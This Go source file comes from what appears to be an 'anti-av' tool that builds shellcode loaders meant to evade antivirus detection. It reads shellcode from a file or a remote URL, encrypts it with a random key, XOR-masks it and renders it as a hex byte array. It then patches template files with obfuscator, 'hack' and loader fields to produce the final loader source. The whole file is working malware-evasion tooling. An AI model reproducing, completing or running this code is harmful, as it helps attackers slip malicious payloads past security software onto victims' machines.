package main

import (
	"fmt"
	"html/template"
	"io/ioutil"
	"math/rand"
	"os"
	"path/filepath"
	"strings"

	"github.com/b1gcat/anti-av/utils"
	"github.com/sirupsen/logrus"
)

type patch struct {
	CODE            string
	HOST_OBFUSCATOR string
	HACK            string
	LOADER          string
}

func (c *config) generateCode() ([]byte, error) {
	var sc []byte
	var err error

	key := make([]byte, 8)
	if strings.HasPrefix(c.shellcode, "http") {
		sc = []byte(c.shellcode)
		//设置远程加载标记
		rand.Read(key[4:])
	} else {
		sc, err = ioutil.ReadFile(c.shellcode)
		if err != nil {
			return nil, err
		}
		rand.Read(key)
	}

	ePayload, err := utils.Crypt(key, sc)
	if err != nil {
		return nil, err
	}

	//KEK
	kek := utils.Kek(ePayload[4:])
	for k := range kek {
		ePayload[k] ^= kek[k]
	}
	return ePayload, nil
}

func (c *config) formatPayload(code []byte) string {
	codeBuf := make([]string, 0)
	for _, v := range code {
		codeBuf = append(codeBuf, fmt.Sprintf("0x%02x", v))
	}
	return strings.Join(codeBuf, ",")
}

func (c *config) patch(ref *patch, dir string) error {
	fis, err := ioutil.ReadDir(dir)
	if err != nil {
		return err
	}
	for _, fi := range fis {
		fullname := filepath.Join(dir, fi.Name())
		if fi.IsDir() {
			err = c.patch(ref, fullname)
			if err != nil {
				logrus.Error("[-] Patching ", err.Error())
				return err
			}
			return nil
		}
		c.filePatch(ref, fullname)
	}

	return nil
}

func (c *config) filePatch(ref *patch, file string) error {
	sc, err := ioutil.ReadFile(file)
	if err != nil {
		return err
	}
	tmpl, err := template.New("attacker").Funcs(template.FuncMap{
		"lt": func(s string) string {
			return s
		},
	}).Parse(string(sc))
	if err != nil {
		return err
	}

	wr, err := os.OpenFile(file, os.O_RDWR|os.O_TRUNC|os.O_CREATE, 0755)
	if err != nil {
		return err
	}
	defer wr.Close()

	if err := tmpl.Execute(wr, ref); err != nil {
		return err
	}

	logrus.Info("[+] Patching ", file)

	return nil
}
